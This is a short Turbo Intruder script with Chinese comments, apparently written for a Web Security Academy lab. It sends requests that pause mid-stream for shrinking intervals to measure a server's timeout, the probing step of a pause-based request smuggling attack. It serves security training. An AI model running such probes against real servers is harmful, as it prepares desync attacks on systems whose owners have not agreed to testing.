def queueRequests(target, wordlists):
    # 单线程
    engine = RequestEngine(endpoint=target.endpoint,
                        concurrentConnections=1,
                        requestsPerConnection=100,
                        pipeline=False,
                        engine=Engine.THREADED
                        )
    
    target_host = 'id.web-security-academy.net'
    # 已知服务器超时 120 秒，从附近范围探测
    init_time = 140000
    step = 10000

    for cur_time in range(init_time, 0, -step):
        # queue 参数：
        ## `pauseMarker` 暂停字符序列的列表
        ## `pauseTime` 暂停的持续时间，以毫秒为单位
        engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=cur_time)

        # 任意后续请求
        followUp = 'GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n'.format(target_host=target_host)
        engine.queue(followUp)
    
# 将所有响应记录到结果表中
def handleResponse(req, interesting):
    table.add(req)
